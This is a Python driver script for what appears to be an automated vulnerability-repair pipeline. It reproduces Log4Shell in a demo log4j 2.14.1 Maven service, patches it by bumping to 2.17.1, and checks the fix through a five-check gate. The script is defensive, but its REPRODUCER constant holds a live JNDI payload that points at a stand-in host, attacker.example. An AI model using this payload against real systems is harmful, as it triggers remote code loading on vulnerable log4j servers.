"""Phase 2 — the Java vertical slice, end to end: `python -m raksha.slice_java`

Drives a real vulnerable Maven service (log4j 2.14.1, Log4Shell) through the real five-check gate
with no human in the loop:

    ingest → oracle → confirm (replay) → repair (template: dependency bump) → gate → verified bundle

The repair lane here is the cheapest one — a dependency bump to log4j 2.17.1 — which is the honest
fix for the most common real vulnerability. The gate proves it: the reproducer no longer fires, the
project's own tests still pass, normal behaviour is byte-identical across a benign corpus, the fix
site is still reached, and a fresh campaign of JNDI variants finds nothing. If the fix fails, the
finding becomes REPORT_ONLY rather than a guess.

Writes `raksha-java-slice.sarif`. Prints the status progression and the scorecard.
"""

from __future__ import annotations

import json
import pathlib
import sys

from .adapters.java import MavenReplayTarget, dependency_bump_patch
from .finding import RepairLane, Reproducer, ReplayResult, Status, to_sarif_log, utcnow
from .gate import decide, run_gate
from .metrics import scorecard
from .oracles import JazzerOracle

ROOT = pathlib.Path(__file__).parents[1]
TARGET = ROOT / "demo-targets" / "java-log4shell"
REPRODUCER = b"svc|${jndi:ldap://attacker.example/a}"
BENIGN_CORPUS = [
    b"alice|login",
    b"bob|logout",
    b"ping",
    b"svc|deploy v2 to prod",
    b"svc|value with ${version} placeholder",
    b"admin|rotate keys",
]

G, R, A, D, B, O = "\033[32m", "\033[31m", "\033[33m", "\033[2m", "\033[1m", "\033[0m"


def step(msg: str) -> None:
    print(f"  {D}·{O} {msg}")


def run() -> int:
    print(f"\n{B}RAKSHA AI — Java vertical slice{O}  {D}log4j 2.14.1 · Log4Shell · CVE-2021-44228{O}\n")
    target = MavenReplayTarget(TARGET)

    # 1 ── INGEST + ORACLE -------------------------------------------------------------------
    print(f"{B}1 · Hunt{O}")
    step("building the target (vulnerable) and replaying one JNDI request")
    vuln = target.build(None)
    if not vuln.ok:
        print(f"  {R}target did not build:{O}\n{vuln.log}")
        return 1
    replay = target.run(vuln, REPRODUCER)
    findings = JazzerOracle().parse(replay.text, target="audit-svc")
    if not findings:
        print(f"  {R}oracle saw nothing — is the build really vulnerable?{O}")
        return 1
    f = findings[0]
    print(f"  {A}SUSPECTED{O}  {f.bug_class}  {f.oracle}")
    step(f"fix site: {f.fix_site_set[0].uri}:{f.fix_site_set[0].start_line}")

    # 2 ── CONFIRM (reproducer replays, oracle fires) ----------------------------------------
    print(f"\n{B}2 · Prove it is real{O}")
    f.attach_reproducer(Reproducer.from_bytes(REPRODUCER, ["java", "ReplayDriver", "repro"], minimised=True))
    f.record_replay_before(ReplayResult(oracle_fired=True, at=utcnow(),
                                        abort_signature=f.abort_signature, exit_code=replay.exit_code))
    f.confirm()
    print(f"  {G}CONFIRMED{O}  reproducer replays, oracle fires  ({f.time_to_pov_seconds:.1f}s to PoV)")

    # 3 ── REPAIR (template lane: dependency bump) -------------------------------------------
    print(f"\n{B}3 · Repair — template lane, zero inference{O}")
    patch = dependency_bump_patch((TARGET / "pom.xml").read_text(), "2.17.1")
    f.mark_patched(patch, RepairLane.TEMPLATE)
    step("bump log4j-core 2.14.1 → 2.17.1 (the JNDI message-lookup is gone in 2.17.1)")

    # 4 ── GATE ------------------------------------------------------------------------------
    print(f"\n{B}4 · The five-check gate{O}")
    verdict = run_gate(f, target, reproducer=REPRODUCER, corpus=BENIGN_CORPUS, refuzz_seconds=0)
    for check, result in f.gate.items():
        mark = f"{G}✓{O}" if result.passed else f"{R}✗{O}"
        print(f"  {mark} {check.value:<20} {D}{result.detail}{O}")
    decide(f, verdict)

    # 5 ── RESULT ----------------------------------------------------------------------------
    print()
    if f.status is Status.VERIFIED:
        print(f"  {G}{B}VERIFIED{O}  patch proven, all five checks passed, PoV dead  "
              f"({f.time_to_patch_seconds:.1f}s end to end)")
    else:
        print(f"  {A}{B}{f.status.value}{O}  {verdict.detail}")

    card = scorecard([f]).as_dict()
    print(f"\n{B}Scorecard{O} {D}(from the records){O}")
    print(f"  Precision     {card['precision']['reports_with_reproducer_pct']}% reports with a replaying reproducer")
    print(f"  Performance   {card['performance']['bugs_verified_fixed']} verified fixed of "
          f"{card['performance']['findings_total']} found")
    print(f"  Resource      {card['resource']['zero_inference_fix_pct']}% of fixes cost zero inference")
    print(f"  Posture       network interfaces {card['posture']['network_interfaces']} · "
          f"cloud calls {card['posture']['cloud_calls']}")

    out = ROOT / "raksha-java-slice.sarif"
    out.write_text(json.dumps(to_sarif_log([f]), indent=2))
    print(f"\n{D}  wrote {out.name} — valid SARIF 2.1.0 with the proof block{O}\n")
    return 0 if f.status is Status.VERIFIED else 2


if __name__ == "__main__":
    sys.exit(run())
